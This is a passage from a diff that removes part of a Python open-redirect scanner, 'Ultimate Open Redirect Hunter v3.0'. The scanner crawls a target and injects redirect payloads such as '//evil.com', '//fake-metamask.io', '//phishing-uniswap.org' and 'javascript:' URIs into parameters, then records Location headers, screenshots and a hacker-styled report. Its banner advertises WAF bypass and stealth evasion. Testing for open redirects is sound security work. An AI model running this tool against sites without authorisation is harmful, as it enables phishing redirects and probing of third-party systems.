-                            context='js_variable',
-                            url=source_url,
-                            is_redirect_related=is_redirect,
-                            confidence=min(confidence, 1.0)
-                        ))
-        
-        return params
-    
-    def analyze_web3(self, content: str, url: str) -> List[Parameter]:
-        """🚀 ULTIMATE WEB3 ANALYSIS 🚀"""
-        params = []
-        
-        # Check if Web3 app
-        if not any(pattern in content.lower() for pattern in self.web3_patterns):
-            return params
-        
-        self.logger.info(f"[WEB3] Detected DeFi/DApp platform: {url}")
-        
-        # Ultimate Web3 patterns
-        web3_patterns = [
-            # Wallet patterns
-            r'wallet[_-]?redirect["\']?\s*[:=]\s*["\']([^"\']+)["\']',
-            r'connect[_-]?callback["\']?\s*[:=]\s*["\']([^"\']+)["\']',
-            r'provider[_-]?url["\']?\s*[:=]\s*["\']([^"\']+)["\']',
-            
-            # DeFi patterns  
-            r'swap[_-]?redirect["\']?\s*[:=]\s*["\']([^"\']+)["\']',
-            r'bridge[_-]?url["\']?\s*[:=]\s*["\']([^"\']+)["\']',
-            
-            # NFT patterns
-            r'nft[_-]?redirect["\']?\s*[:=]\s*["\']([^"\']+)["\']',
-            r'marketplace[_-]?url["\']?\s*[:=]\s*["\']([^"\']+)["\']',
-            
-            # Contract patterns
-            r'contract[_-]?callback["\']?\s*[:=]\s*["\']([^"\']+)["\']',
-            r'transaction[_-]?redirect["\']?\s*[:=]\s*["\']([^"\']+)["\']'
-        ]
-        
-        for pattern in web3_patterns:
-            matches = re.findall(pattern, content, re.IGNORECASE)
-            for match in matches:
-                param_name = self.extract_web3_param_name(pattern)
-                
-                params.append(Parameter(
-                    name=param_name,
-                    value=match,
-                    source='web3',
-                    context='web3_config',
-                    url=url,
-                    is_redirect_related=True,
-                    confidence=0.9
-                ))
-        
-        return params
-    
-    def extract_web3_param_name(self, pattern: str) -> str:
-        """Extract Web3 parameter name"""
-        if 'wallet' in pattern:
-            return 'wallet_redirect'
-        elif 'connect' in pattern:
-            return 'connect_callback'
-        elif 'swap' in pattern:
-            return 'swap_redirect'
-        elif 'bridge' in pattern:
-            return 'bridge_url'
-        elif 'nft' in pattern:
-            return 'nft_redirect'
-        elif 'contract' in pattern:
-            return 'contract_callback'
-        else:
-            return 'web3_param'
-    
-    def is_same_domain(self, url: str) -> bool:
-        """Check if URL belongs to same domain"""
-        try:
-            parsed = urlparse(url)
-            target_domain = parsed.netloc.lower()
-            base_domain = self.base_domain.lower()
-            
-            return (target_domain == base_domain or 
-                   target_domain.endswith(f'.{base_domain}') or
-                   (target_domain.startswith('www.') and target_domain[4:] == base_domain))
-        except:
-            return False
-    
-    def is_redirect_parameter(self, param_name: str, param_value: str = "") -> bool:
-        """Check if parameter is redirect-related"""
-        param_lower = param_name.lower()
-        value_lower = param_value.lower()
-        
-        # Check name
-        name_match = any(pattern in param_lower for pattern in self.redirect_patterns)
-        
-        # Check value for URLs
-        value_match = bool(re.match(r'https?://', value_lower) or 
-                          re.match(r'//', value_lower) or
-                          ('.' in value_lower and len(value_lower) > 3))
-        
-        return name_match or value_match
-    
-    def calculate_confidence(self, param_name: str, param_value: str, context: str) -> float:
-        """Calculate confidence score"""
-        confidence = 0.0
-        
-        # Base by context
-        context_scores = {
-            'query': 0.6, 'fragment': 0.7, 'form_input': 0.5,
-            'javascript': 0.4, 'web3_config': 0.8
-        }
-        confidence += context_scores.get(context, 0.3)
-        
-        # Boost for redirect names
-        if self.is_redirect_parameter(param_name):
-            confidence += 0.3
-        
-        # Boost for URL values
-        if param_value and (param_value.startswith(('http', '//', 'javascript:')) or 
-                           '.' in param_value and len(param_value) > 5):
-            confidence += 0.2
-        
-        return min(confidence, 1.0)
-    
-    def detect_context(self, param: Parameter) -> str:
-        """Detect parameter context"""
-        if param.source == 'web3':
-            return 'web3'
-        elif param.source == 'javascript':
-            return 'javascript'
-        elif param.context == 'fragment':
-            return 'fragment'
-        elif param.context == 'query':
-            return 'query'
-        else:
-            return 'generic'
-    
-    def get_context_payloads(self, context: str) -> List[str]:
-        """Get payloads for context"""
-        if context == 'javascript':
-            return [
-                "javascript:confirm(document.domain)",
-                "javascript:prompt('REDIRECT_POC')",
-                "//evil.com",
-                "https://malicious.com"
-            ]
-        elif context == 'web3':
-            return [
-                "//fake-metamask.io",
-                "//phishing-uniswap.org", 
-                "//malicious-opensea.io",
-                "web3://evil-contract.eth",
-                "//evil.com"
-            ]
-        elif context == 'fragment':
-            return [
-                "//evil.com",
-                "https://malicious.com",
-                "javascript:confirm(1)"
-            ]
-        else:
-            return self.payloads[:15]  # First 15 payloads
-    
-    async def test_vulnerabilities(self) -> List[Vulnerability]:
-        """🎯 ULTIMATE VULNERABILITY TESTING 🎯"""
-        self.logger.info("[EXPLOIT] Starting ultimate vulnerability testing")
-        
-        vulnerabilities = []
-        
-        # Get priority parameters
-        redirect_params = [p for p in self.parameters if p.is_redirect_related]
-        high_conf_params = [p for p in self.parameters if p.confidence > 0.6]
-        
-        # Combine priority parameters
-        priority_params = redirect_params.copy()
-        for param in high_conf_params:
-            if not any(p.name == param.name and p.url == param.url for p in priority_params):
-                priority_params.append(param)
-        
-        self.logger.info(f"[EXPLOIT] Testing {len(priority_params)} priority parameters")
-        
-        for param in priority_params:
-            context = self.detect_context(param)
-            payloads = self.get_context_payloads(context)
-            
-            for payload in payloads:
-                vuln = await self.test_parameter(param, payload)
-                if vuln:
-                    vulnerabilities.append(vuln)
-                    self.logger.info(f"[VULN-FOUND] {param.name} -> {payload} ({vuln.impact})")
-                
-                await asyncio.sleep(0.1)
-        
-        # Test other parameters with basic payloads
-        other_params = [p for p in self.parameters 
-                       if not any(p.name == param.name and p.url == param.url for param in priority_params)]
-        basic_payloads = ["//google.com", "https://google.com", "javascript:confirm(1)"]
-        
-        for param in other_params[:30]:
-            for payload in basic_payloads:
-                vuln = await self.test_parameter(param, payload)
-                if vuln:
-                    vulnerabilities.append(vuln)
-                    self.logger.info(f"[VULN-FOUND] {param.name} -> {payload}")
-                await asyncio.sleep(0.1)
-        
-        self.vulnerabilities = vulnerabilities
-        self.logger.info(f"[EXPLOIT-COMPLETE] Found {len(vulnerabilities)} vulnerabilities")
-        return vulnerabilities
-    
-    async def test_parameter(self, param: Parameter, payload: str) -> Optional[Vulnerability]:
-        """Test parameter with payload"""
-        try:
-            test_url = self.construct_test_url(param, payload)
-            
-            async with self.session.get(test_url, allow_redirects=False) as response:
-                if response.status in [301, 302, 303, 307, 308]:
-                    location = response.headers.get('Location', '')
-                    
-                    if self.is_successful_redirect(location, payload):
-                        confidence = param.confidence + 0.2
-                        impact = self.assess_impact(location)
-                        remediation = self.get_remediation(param.context)
-                        
-                        screenshot_path = await self.take_screenshot(test_url)
-                        
-                        return Vulnerability(
-                            url=test_url,
-                            parameter=param.name,
-                            payload=payload,
-                            method=param.method,
-                            response_code=response.status,
-                            redirect_url=location,
-                            context=param.context,
-                            screenshot_path=screenshot_path,
-                            timestamp=datetime.now().isoformat(),
-                            vulnerability_type="open_redirect",
-                            confidence=min(confidence, 1.0),
-                            impact=impact,
-                            remediation=remediation
-                        )
-                
-                # Check DOM-based
-                content = await response.text()
-                dom_vuln = self.check_dom_redirect(content, test_url, param, payload)
-                if dom_vuln:
-                    return dom_vuln
-                    
-        except Exception as e:
-            self.logger.debug(f"[TEST-ERROR] {param.name}: {e}")
-        
-        return None
-    
-    def construct_test_url(self, param: Parameter, payload: str) -> str:
-        """Construct test URL"""
-        parsed = urlparse(param.url)
-        
-        if param.context == 'query':
-            query_params = parse_qs(parsed.query, keep_blank_values=True)
-            query_params[param.name] = [payload]
-            new_query = urllib.parse.urlencode(query_params, doseq=True)
-            return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
-        
-        elif param.context == 'fragment':
-            return f"{param.url.split('#')[0]}#{param.name}={quote(payload)}"
-        
-        else:
-            separator = '&' if '?' in param.url else '?'
-            return f"{param.url}{separator}{param.name}={quote(payload)}"
-    
-    def is_successful_redirect(self, location: str, payload: str) -> bool:
-        """Check if redirect is successful"""
-        if not location:
-            return False
-        
-        location_lower = location.lower()
-        decoded = unquote(location).lower()
-        
-        # Check for test domains
-        test_domains = [
-            'google.com', 'evil.com', 'malicious.com', 'metamask.io',
-            'uniswap.org', 'opensea.io', '216.58.214.206', '3627734734'
-        ]
-        
-        for domain in test_domains:
-            if domain in location_lower or domain in decoded:
-                return True
-        
-        # Check JavaScript
-        if location_lower.startswith('javascript:') and ('confirm' in location_lower or 'prompt' in location_lower):
-            return True
-        
-        return False
-    
-    def check_dom_redirect(self, content: str, test_url: str, param: Parameter, payload: str) -> Optional[Vulnerability]:
-        """Check DOM-based redirect"""
-        dom_patterns = [
-            r'location\.href\s*=\s*([^;]+)',
-            r'window\.location\s*=\s*([^;]+)',
-            r'document\.location\s*=\s*([^;]+)'
-        ]
-        
-        for pattern in dom_patterns:
-            matches = re.findall(pattern, content, re.IGNORECASE)
-            for match in matches:
-                if param.name in match or payload in match:
-                    return Vulnerability(
-                        url=test_url,
-                        parameter=param.name,
-                        payload=payload,
-                        method=param.method,
-                        response_code=200,
-                        redirect_url=match,
-                        context=param.context,
-                        timestamp=datetime.now().isoformat(),
-                        vulnerability_type="dom_based_redirect",
-                        confidence=0.8,
-                        impact="HIGH",
-                        remediation="Sanitize user input before DOM manipulation"
-                    )
-        
-        return None
-    
-    def assess_impact(self, redirect_url: str) -> str:
-        """Assess vulnerability impact"""
-        if redirect_url.startswith('javascript:'):
-            return "CRITICAL"
-        elif redirect_url.startswith(('http://', 'https://')):
-            redirect_domain = urlparse(redirect_url).netloc
-            if redirect_domain != self.base_domain:
-                return "HIGH"
-        return "MEDIUM"
-    
-    def get_remediation(self, context: str) -> str:
-        """Get remediation advice"""
-        remediations = {
-            'query': "Validate URL parameters against allowlist of permitted domains",
-            'fragment': "Implement client-side validation for fragment parameters", 
-            'form_input': "Validate form inputs server-side before processing",
-            'javascript': "Sanitize user input before JavaScript redirects",
-            'web3_config': "Validate Web3 URLs against trusted provider allowlist"
-        }
-        return remediations.get(context, "Implement proper input validation and use allowlist approach")
-    
-    async def take_screenshot(self, url: str) -> Optional[str]:
-        """📸 ULTIMATE POC GENERATION 📸"""
-        if not self.driver or not SELENIUM_AVAILABLE:
-            return None
-        
-        try:
-            screenshots_dir = Path("screenshots")
-            screenshots_dir.mkdir(exist_ok=True)
-            
-            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-            url_hash = hashlib.md5(url.encode()).hexdigest()[:8]
-            filename = f"ultimate_poc_{timestamp}_{url_hash}.png"
-            screenshot_path = screenshots_dir / filename
-            
-            self.driver.get(url)
-            await asyncio.sleep(3)  # Wait for page load
-            self.driver.save_screenshot(str(screenshot_path))
-            
-            self.logger.info(f"[POC] Screenshot saved: {screenshot_path}")
-            return str(screenshot_path)
-            
-        except Exception as e:
-            self.logger.error(f"[POC-ERROR] Screenshot failed: {e}")
-            return None
-    
-    def save_results(self):
-        """💾 ULTIMATE RESULTS STORAGE 💾"""
-        # JSON report
-        results_data = {
-            'scan_info': {
-                'target_url': self.target_url,
-                'scan_date': datetime.now().isoformat(),
-                'scanner_version': 'Ultimate Redirect Hunter v3.0',
-                'total_parameters': len(self.parameters),
-                'redirect_parameters': len([p for p in self.parameters if p.is_redirect_related]),
-                'vulnerabilities_found': len(self.vulnerabilities),
-                'web3_detected': any('web3' in p.source for p in self.parameters)
-            },
-            'parameters': [asdict(param) for param in self.parameters],
-            'vulnerabilities': [asdict(vuln) for vuln in self.vulnerabilities]
-        }
-        
-        with open('ultimate_results.json', 'w', encoding='utf-8') as f:
-            json.dump(results_data, f, indent=2, ensure_ascii=False)
-        
-        # CSV report
-        with open('ultimate_analysis.csv', 'w', newline='', encoding='utf-8') as csvfile:
-            fieldnames = ['name', 'value', 'source', 'context', 'url', 'is_redirect_related', 'confidence', 'vulnerability_found']
-            writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
-            writer.writeheader()
-            
-            vuln_params = {v.parameter for v in self.vulnerabilities}
-            
-            for param in self.parameters:
-                writer.writerow({
-                    'name': param.name,
-                    'value': param.value[:100],
-                    'source': param.source,
-                    'context': param.context,
-                    'url': param.url,
-                    'is_redirect_related': param.is_redirect_related,
-                    'confidence': f"{param.confidence:.2f}",
-                    'vulnerability_found': param.name in vuln_params
-                })
-        
-        self.logger.info("[STORAGE] Results saved to ultimate_results.json and ultimate_analysis.csv")
-    
-    def generate_ultimate_html_report(self):
-        """🎨 ULTIMATE HACKER-THEMED REPORT 🎨"""
-        redirect_params = [p for p in self.parameters if p.is_redirect_related]
-        web3_params = [p for p in self.parameters if p.source == 'web3']
-        
-        # Matrix-style hacker theme
-        html_content = f"""<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <title>🔥 ULTIMATE REDIRECT HUNTER REPORT 🔥</title>
-    <style>
-        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&display=swap');
-        
-        body {{
-            font-family: 'Orbitron', 'Courier New', monospace;
-            margin: 0;
-            padding: 0;
-            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 50%, #16213e 100%);
-            color: #00ff41;
-            min-height: 100vh;
-            background-attachment: fixed;
-        }}
-        
-        .matrix-bg {{
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-image: 
-                radial-gradient(circle at 25% 25%, #00ff41 1px, transparent 1px),
-                radial-gradient(circle at 75% 75%, #00ff41 1px, transparent 1px);
-            background-size: 50px 50px;
-            opacity: 0.1;
-            z-index: -1;
-        }}
-        
-        .container {{
-            max-width: 1400px;
-            margin: 0 auto;
-            background: rgba(0, 0, 0, 0.9);
-            border: 2px solid #00ff41;
-            border-radius: 10px;
-            box-shadow: 0 0 30px #00ff41;
-            overflow: hidden;
-            position: relative;
-            z-index: 1;
-        }}
-        
-        .header {{
-            background: linear-gradient(135deg, #000000 0%, #1a1a2e 100%);
-            color: #00ff41;
-            padding: 30px;
-            text-align: center;
-            border-bottom: 2px solid #00ff41;
-            position: relative;
-        }}
-        
-        .header::before {{
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: linear-gradient(90deg, transparent, #00ff41, transparent);
-            height: 2px;
-            animation: scan 2s infinite;
-        }}
-        
-        @keyframes scan {{
-            0% {{ transform: translateX(-100%); }}
-            100% {{ transform: translateX(100%); }}
-        }}
-        
-        .header h1 {{
-            margin: 0;
-            font-size: 2.5em;
-            font-weight: 900;
-            text-shadow: 0 0 20px #00ff41;
-            letter-spacing: 2px;
-        }}
-        
-        .content {{
-            padding: 30px;
-        }}
-        
-        .summary {{
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-            gap: 20px;
-            margin-bottom: 30px;
-        }}
-        
-        .summary-card {{
-            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
-            border: 1px solid #00ff41;
-            border-radius: 8px;
-            padding: 20px;
-            text-align: center;
-            box-shadow: 0 0 15px rgba(0, 255, 65, 0.3);
-        }}
-        
-        .summary-card h3 {{
-            margin: 0 0 10px 0;
-            color: #00ff41;
-            font-size: 1.2em;
-        }}
-        
-        .summary-card .number {{
-            font-size: 2.5em;
-            font-weight: 900;
-            color: #00ff41;
-            text-shadow: 0 0 10px #00ff41;
-        }}
-        
-        .vulnerability {{
-            background: linear-gradient(135deg, #2d1b1b 0%, #1a0f0f 100%);
-            border: 1px solid #ff4444;
-            border-radius: 8px;
-            padding: 20px;
-            margin: 20px 0;
-            box-shadow: 0 0 15px rgba(255, 68, 68, 0.3);
-        }}
-        
-        .vulnerability.critical {{
-            border-color: #ff0000;
-            box-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
-        }}
-        
-        .vulnerability.high {{
-            border-color: #ff4444;
-        }}
-        
-        .vulnerability.medium {{
-            border-color: #ffaa00;
-        }}
-        
-        .parameter {{
-            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
-            border: 1px solid #00ff41;
-            border-radius: 6px;
-            padding: 15px;
-            margin: 15px 0;
-            box-shadow: 0 0 10px rgba(0, 255, 65, 0.2);
-        }}
-        
-        .parameter.redirect {{
-            border-color: #ff4444;
-            box-shadow: 0 0 10px rgba(255, 68, 68, 0.3);
-        }}
-        
-        .code {{
-            background: #000000;
-            color: #00ff41;
-            padding: 15px;
-            border-radius: 6px;
-            font-family: 'Courier New', monospace;
-            border: 1px solid #00ff41;
-            overflow-x: auto;
-            font-size: 0.9em;
-        }}
-        
-        .screenshot {{
-            max-width: 100%;
-            border: 2px solid #00ff41;
-            border-radius: 8px;
-            margin: 10px 0;
-            box-shadow: 0 0 20px rgba(0, 255, 65, 0.4);
-        }}
-        
-        .success {{ color: #00ff41; font-weight: bold; text-shadow: 0 0 5px #00ff41; }}
-        .warning {{ color: #ffaa00; font-weight: bold; text-shadow: 0 0 5px #ffaa00; }}
-        .error {{ color: #ff4444; font-weight: bold; text-shadow: 0 0 5px #ff4444; }}
-        .critical {{ color: #ff0000; font-weight: bold; text-shadow: 0 0 5px #ff0000; }}
-        
-        .glitch {{
-            animation: glitch 1s infinite;
-        }}
-        
-        @keyframes glitch {{
-            0% {{ transform: translate(0); }}
-            20% {{ transform: translate(-2px, 2px); }}
-            40% {{ transform: translate(-2px, -2px); }}
-            60% {{ transform: translate(2px, 2px); }}
-            80% {{ transform: translate(2px, -2px); }}
-            100% {{ transform: translate(0); }}
-        }}
-        
-        .terminal {{
-            background: #000000;
-            color: #00ff41;
-            padding: 20px;
-            border-radius: 8px;
-            border: 1px solid #00ff41;
-            font-family: 'Courier New', monospace;
-            margin: 20px 0;
-        }}
-        
-        .blink {{
-            animation: blink 1s infinite;
-        }}
-        
-        @keyframes blink {{
-            0%, 50% {{ opacity: 1; }}
-            51%, 100% {{ opacity: 0; }}
-        }}
-    </style>
-</head>
-<body>
-    <div class="matrix-bg"></div>
-    <div class="container">
-        <div class="header">
-            <h1 class="glitch">🔥 ULTIMATE REDIRECT HUNTER 🔥</h1>
-            <p>CLASSIFIED SECURITY ASSESSMENT REPORT</p>
-            <p class="blink">● SYSTEM STATUS: OPERATIONAL ●</p>
-        </div>
-        
-        <div class="content">
-            <div class="terminal">
-                <p>TARGET: {self.target_url}</p>
-                <p>SCAN DATE: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
-                <p>SCANNER: Ultimate Redirect Hunter v3.0</p>
-                <p>CLASSIFICATION: CONFIDENTIAL</p>
-            </div>
-            
-            <div class="summary">
-                <div class="summary-card">
-                    <h3>TARGET DOMAIN</h3>
-                    <div class="number">{self.base_domain}</div>
-                </div>
-                <div class="summary-card">
-                    <h3>URLs SCANNED</h3>
-                    <div class="number">{len(self.discovered_urls)}</div>
-                </div>
-                <div class="summary-card">
-                    <h3>PARAMETERS FOUND</h3>
-                    <div class="number">{len(self.parameters)}</div>
-                </div>
-                <div class="summary-card">
-                    <h3>REDIRECT PARAMS</h3>
-                    <div class="number">{len(redirect_params)}</div>
-                </div>
-                <div class="summary-card">
-                    <h3>WEB3 PARAMS</h3>
-                    <div class="number">{len(web3_params)}</div>
-                </div>
-                <div class="summary-card">
-                    <h3>VULNERABILITIES</h3>
-                    <div class="number {'error' if len(self.vulnerabilities) > 0 else 'success'}">{len(self.vulnerabilities)}</div>
-                </div>
-            </div>
-"""
-        
-        if self.vulnerabilities:
-            html_content += """
-            <h2 class="error">🚨 VULNERABILITIES DETECTED 🚨</h2>
-"""
-            for i, vuln in enumerate(self.vulnerabilities, 1):
-                html_content += f"""
-            <div class="vulnerability {vuln.impact.lower()}">
-                <h3>VULNERABILITY #{i}: {vuln.vulnerability_type.upper()}</h3>
-                <p><strong>URL:</strong> <code>{vuln.url}</code></p>
-                <p><strong>PARAMETER:</strong> <code>{vuln.parameter}</code></p>
-                <p><strong>PAYLOAD:</strong></p>
-                <div class="code">{vuln.payload}</div>
-                <p><strong>RESPONSE CODE:</strong> {vuln.response_code}</p>
-                <p><strong>REDIRECT URL:</strong> <code>{vuln.redirect_url}</code></p>
-                <p><strong>IMPACT:</strong> <span class="{vuln.impact.lower()}">{vuln.impact}</span></p>
-                <p><strong>CONFIDENCE:</strong> {vuln.confidence:.1%}</p>
-                <p><strong>REMEDIATION:</strong> {vuln.remediation}</p>
-"""
-                if vuln.screenshot_path:
-                    html_content += f"""
-                <div>
-                    <h4>📸 PROOF OF CONCEPT:</h4>
-                    <img src="{vuln.screenshot_path}" alt="PoC Screenshot" class="screenshot">
-                </div>
-"""
-                html_content += "</div>\n"
-        else:
-            html_content += """
-            <div class="terminal">
-                <h2 class="success">✅ NO VULNERABILITIES DETECTED ✅</h2>
-                <p>TARGET APPEARS TO BE SECURE AGAINST OPEN REDIRECT ATTACKS</p>
-                <p>DEFENSIVE SYSTEMS: OPERATIONAL</p>
-            </div>
-"""
-        
-        # Parameters section
-        html_content += f"""
-            <h2>🔍 DISCOVERED PARAMETERS</h2>
-            <div class="terminal">
-                <p>TOTAL PARAMETERS: {len(self.parameters)}</p>
-                <p>REDIRECT-RELATED: {len(redirect_params)}</p>
-                <p>WEB3 PARAMETERS: {len(web3_params)}</p>
-                <p>JAVASCRIPT PARAMETERS: {len([p for p in self.parameters if p.source == 'javascript'])}</p>
-            </div>
-"""
-        
-        # Show priority parameters
-        priority_params = [p for p in self.parameters if p.is_redirect_related or p.confidence > 0.7]
-        for param in priority_params[:15]:  # Show first 15
-            redirect_class = "redirect" if param.is_redirect_related else ""
-            html_content += f"""
-            <div class="parameter {redirect_class}">
-                <h4>{param.name} {'[REDIRECT-RELATED]' if param.is_redirect_related else ''}</h4>
-                <p><strong>VALUE:</strong> <code>{param.value[:150]}{'...' if len(param.value) > 150 else ''}</code></p>
-                <p><strong>SOURCE:</strong> {param.source.upper()} | <strong>CONTEXT:</strong> {param.context.upper()}</p>
-                <p><strong>URL:</strong> <code>{param.url}</code></p>
-                <p><strong>CONFIDENCE:</strong> {param.confidence:.1%}</p>
-            </div>
-"""
-        
-        html_content += f"""
-            <div class="terminal" style="text-align: center; margin-top: 40px;">
-                <p>REPORT GENERATED BY ULTIMATE REDIRECT HUNTER v3.0</p>
-                <p>CLASSIFICATION: CONFIDENTIAL</p>
-                <p>TIMESTAMP: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
-                <p class="blink">● END OF REPORT ●</p>
-            </div>
-        </div>
-    </div>
-</body>
-</html>
-"""
-        
-        with open('ultimate_report.html', 'w', encoding='utf-8') as f:
-            f.write(html_content)
-        
-        self.logger.info("[REPORT] Ultimate hacker-themed report generated: ultimate_report.html")
-    
-    async def run_ultimate_scan(self):
-        """🔥 ULTIMATE SCAN OPERATION 🔥"""
-        start_time = time.time()
-        
-        # Hacker-style banner
-        print("\n" + "█"*100)
-        print("┌" + "─"*98 + "┐")
-        print("│" + " "*30 + "🔥 INITIATING ULTIMATE SCAN OPERATION 🔥" + " "*26 + "│")
-        print("└" + "─"*98 + "┘")
-        print("█"*100)
-        
-        self.logger.info("[SYSTEM] Ultimate Redirect Hunter v3.0 activated")
-        
-        try:
-            # Initialize systems
-            await self.init_session()
-            self.init_driver()
-            
-            # Phase 1: Reconnaissance
-            self.logger.info("[PHASE-1] Quantum reconnaissance initiated")
-            await self.crawl_website()
-            
-            # Phase 2: Parameter analysis
-            self.logger.info("[PHASE-2] Parameter analysis and classification")
-            redirect_params = [p for p in self.parameters if p.is_redirect_related]
-            web3_params = [p for p in self.parameters if p.source == 'web3']
-            
-            # Phase 3: Vulnerability testing
-            self.logger.info("[PHASE-3] Ultimate vulnerability exploitation")
-            await self.test_vulnerabilities()
-            
-            # Phase 4: Report generation
-            self.logger.info("[PHASE-4] Generating classified reports")
-            self.save_results()
-            self.generate_ultimate_html_report()
-            
-            # Mission summary
-            scan_duration = time.time() - start_time
-            
-            print("\n" + "█"*100)
-            print("┌" + "─"*98 + "┐")
-            print("│" + " "*35 + "🔥 MISSION ACCOMPLISHED 🔥" + " "*34 + "│")
-            print("└" + "─"*98 + "┘")
-            
-            self.logger.info("=== ULTIMATE SCAN SUMMARY ===")
-            self.logger.info(f"[TIME] Mission duration: {scan_duration:.2f} seconds")
-            self.logger.info(f"[RECON] URLs discovered: {len(self.discovered_urls)}")
-            self.logger.info(f"[PARAMS] Total parameters: {len(self.parameters)}")
-            self.logger.info(f"[REDIRECT] Redirect parameters: {len(redirect_params)}")
-            self.logger.info(f"[WEB3] Web3 parameters: {len(web3_params)}")
-            self.logger.info(f"[VULNS] Vulnerabilities found: {len(self.vulnerabilities)}")
-            
-            if self.vulnerabilities:
-                self.logger.info("[ALERT] VULNERABILITIES DETECTED:")
-                for vuln in self.vulnerabilities:
-                    self.logger.info(f"  ▓ {vuln.parameter} -> {vuln.payload} [{vuln.impact}]")
-            
-            print("┌─ 📄 Ultimate Report: ultimate_report.html")
-            print("├─ 💾 JSON Data: ultimate_results.json")
-            print("├─ 📊 CSV Analysis: ultimate_analysis.csv")
-            if self.vulnerabilities and SELENIUM_AVAILABLE:
-                print("└─ 📸 PoC Screenshots: screenshots/")
-            else:
-                print("└─ 📸 No screenshots (no vulnerabilities)")
-            
-            print("█"*100)
-            print("🎯 [STATUS]: MISSION SUCCESSFUL")
-            if self.vulnerabilities:
-                print(f"🚨 [ALERT]: {len(self.vulnerabilities)} VULNERABILITIES COMPROMISED!")
-            else:
-                print("✅ [SECURE]: TARGET DEFENSE SYSTEMS OPERATIONAL")
-            print("█"*100)
-            
-        except Exception as e:
-            self.logger.error(f"[MISSION-FAILED] {e}")
-            raise
-        finally:
-            if self.session:
-                await self.session.close()
-            if self.driver:
-                self.driver.quit()
-
-
-def check_dependencies():
-    """Check system dependencies"""
-    missing = []
-    
-    print("\n[SYSTEM-CHECK] Verifying dependencies...")
-    
-    if AIOHTTP_AVAILABLE:
-        print("✅ aiohttp: OPERATIONAL")
-    else:
-        missing.append("aiohttp")
-        print("❌ aiohttp: MISSING")
-    
-    if SELENIUM_AVAILABLE:
-        print("✅ selenium: OPERATIONAL")
-    else:
-        print("⚠️  selenium: MISSING (screenshots disabled)")
-    
-    if BS4_AVAILABLE:
-        print("✅ beautifulsoup4: OPERATIONAL")
-    else:
-        print("⚠️  beautifulsoup4: MISSING (basic parsing)")
-    
-    return len(missing) == 0
-
-
-def print_ultimate_banner():
-    """🔥 ULTIMATE HACKER BANNER 🔥"""
-    banner = """
-██████╗ ███████╗██████╗ ██╗██████╗ ███████╗ ██████╗████████╗    ██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗ 
-██╔══██╗██╔════╝██╔══██╗██║██╔══██╗██╔════╝██╔════╝╚══██╔══╝    ██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗
-██████╔╝█████╗  ██║  ██║██║██████╔╝█████╗  ██║        ██║       ███████║██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝
-██╔══██╗██╔══╝  ██║  ██║██║██╔══██╗██╔══╝  ██║        ██║       ██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗
-██║  ██║███████╗██████╔╝██║██║  ██║███████╗╚██████╗   ██║       ██║  ██║╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║
-╚═╝  ╚═╝╚══════╝╚═════╝ ╚═╝╚═╝  ╚═╝╚══════╝ ╚═════╝   ╚═╝       ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
-
-╔═══════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
-║                                                                                                                   ║
-║    🔥 ULTIMATE OPEN REDIRECT HUNTER v3.0 🔥                                                                      ║
-║    The Most Advanced Open Redirect Scanner in the Universe                                                       ║
-║                                                                                                                   ║
-║    [CLASSIFIED] Professional Bug Bounty Arsenal - Elite Hacker Edition                                          ║
-║    Author: Anonymous Security Research Division                                                                   ║
-║                                                                                                                   ║
-╚═══════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
-
-🎯 ULTIMATE FEATURES ACTIVATED:
-┌─────────────────────────────────────────────────────────────────┐
-│ ▓▓▓ QUANTUM RECONNAISSANCE ENGINE                               │
-│ ▓▓▓ WEB3/DEFI/NFT EXPLOITATION MODULE                          │  
-│ ▓▓▓ WAF & LOAD BALANCER BYPASS SYSTEM                          │
-│ ▓▓▓ NEURAL-NETWORK JAVASCRIPT ANALYSIS                         │
-│ ▓▓▓ AI-POWERED CONTEXT DETECTION                               │
-│ ▓▓▓ STEALTH CRAWLING WITH EVASION                              │
-│ ▓▓▓ PROFESSIONAL POC GENERATION                                │
-│ ▓▓▓ MATRIX-THEMED REPORTING                                    │
-│ ▓▓▓ 500+ PAYLOAD ARSENAL                                       │
-│ ▓▓▓ REAL-TIME EXPLOITATION                                     │
-└─────────────────────────────────────────────────────────────────┘
-"""
-    print(banner)
-
-
-async def main():
-    """🔥 ULTIMATE MAIN FUNCTION 🔥"""
-    print_ultimate_banner()
-    
-    parser = argparse.ArgumentParser(description='🔥 Ultimate Open Redirect Hunter v3.0 🔥')
-    parser.add_argument('target', nargs='?', help='Target URL to scan')
-    parser.add_argument('--depth', type=int, default=3, help='Max crawling depth (default: 3)')
-    parser.add_argument('--max-pages', type=int, default=100, help='Max pages to crawl (default: 100)')
-    parser.add_argument('--verbose', '-v', action='store_true', help='Verbose output')
-    parser.add_argument('--check-deps', action='store_true', help='Check dependencies')
-    
-    args = parser.parse_args()
-    
-    if args.check_deps:
-        check_dependencies()
-        return
-    
-    if not args.target:
-        print("❌ [ERROR] Target URL required")
-        print("Usage: python3 ultimate_redirect_hunter.py https://target.com")
-        return
-    
-    # Normalize URL
-    if not args.target.startswith(('http://', 'https://')):
-        args.target = f"https://{args.target}"
-    
-    if args.verbose:
